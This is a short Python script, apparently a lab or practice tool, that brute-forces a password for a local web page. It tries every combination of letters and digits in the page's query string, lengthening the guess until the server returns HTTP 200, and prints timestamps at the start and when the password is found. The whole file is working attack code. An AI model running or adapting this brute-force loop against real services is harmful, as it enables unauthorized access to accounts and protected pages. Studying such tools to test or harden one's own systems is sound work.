import requests as req
from string import ascii_letters, digits
import itertools
from datetime import datetime

URL = "http://localhost:8080/secret.html?password="

s = req.Session()


def brute(length):
    for combination in itertools.product(ascii_letters + digits, repeat=length):
        password = "".join(combination)
        r = s.get(URL + password)
        if r.status_code == 200:
            return password

    return brute(length + 1)


print(f"[{datetime.now().strftime('%H:%M:%S')}] Starting brute force")
password = brute(0)
print(f"[{datetime.now().strftime('%H:%M:%S')}] Found password: {password}")
